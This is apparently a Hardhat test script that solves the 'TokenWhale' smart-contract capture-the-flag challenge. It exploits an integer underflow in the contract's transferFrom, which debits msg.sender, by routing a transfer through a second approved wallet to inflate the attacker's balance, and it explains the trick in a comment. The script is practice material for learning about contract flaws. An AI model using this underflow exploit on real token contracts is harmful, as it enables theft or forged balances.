const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x842d8D5858f5cE5673B9D52673ae30E8a6fe6a36";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  wallet2 = accounts[1];
  const factory = await ethers.getContractFactory("TokenWhaleChallenge");
  tokenWhale = factory.attach(CHALLENGE_ADDRESS);
});

it("TokenWhale", async function () {
  const myBalanceBefore = await tokenWhale.balanceOf(eoa.address);
  console.log("My balance of SET before: ", myBalanceBefore);

  console.log("initiating transaction to transfer SET to wallet2");
  const tx1 = await tokenWhale
    .connect(eoa)
    .transfer(wallet2.address, myBalanceBefore.sub(1));
  await tx1.wait();
  console.log("transfer to wallet2 complete");

  const myBalanceAfter = await tokenWhale.balanceOf(eoa.address);
  console.log("My balance of SET after transfer: ", myBalanceAfter);

  const wallet2Balance = await tokenWhale.balanceOf(wallet2.address);
  console.log("Wallet2 balance of SET after transfer: ", wallet2Balance);

  console.log("Giving approval to eoa to spend tokens of Wallet2");
  const approvalTx = await tokenWhale
    .connect(wallet2)
    .approve(eoa.address, wallet2Balance);
  await approvalTx.wait();
  console.log(
    `eoa approved to spend ${wallet2Balance} of SET tokens from Wallet2`
  );

  console.log(
    `initiating transferFrom() of ${wallet2Balance} amount from Wallet2 to result in underflow!`
  );
  /**
   * We are not transferring to eoa as it will lead to correction in underflow.
   * e.g, if balanceOf(eoa) = 1:
   * balanceOf[msg.sender] -= value; (msg.sender is eoa, hence balanceOf(eoa) appx 2**256 - value +1
   * balanceOf[to] += value; but `to` will also be eoa, so final value will be (2**256 - value + 1) + value i.e 1
   */
  const tx2 = await tokenWhale
    .connect(eoa)
    .transferFrom(wallet2.address, wallet2.address, wallet2Balance);
  await tx2.wait();
  console.log("transferFrom() completed");

  const myBalanceFinal = await tokenWhale.balanceOf(eoa.address);
  console.log("my balance at the end: ", myBalanceFinal);
  const isComplete = await tokenWhale.isComplete();
  expect(isComplete).to.be.true;
  util.updateTotalPoints(scriptName);
});
